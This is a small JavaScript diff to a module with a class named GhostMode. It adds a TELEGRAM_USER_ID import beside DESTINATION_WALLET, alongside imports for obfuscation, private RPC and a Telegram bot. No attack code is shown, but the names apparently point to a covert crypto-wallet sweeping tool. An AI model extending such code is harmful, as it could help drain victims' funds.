@@ -13,7 +13,8 @@ const obfuscation = require('../services/obfuscation');
 const errorHandler = require('../network/errorHandler');
 const privateRPC = require('../network/privateRPC');
 const telegramBot = require('../bot/telegramBot');
-const { DESTINATION_WALLET, SETTINGS } = require('../../config/constants');
+// 🔥 FIX: TELEGRAM_USER_ID add kiya
+const { DESTINATION_WALLET, TELEGRAM_USER_ID, SETTINGS } = require('../../config/constants');
 const logger = require('../../utils/logger');
 
 class GhostMode {
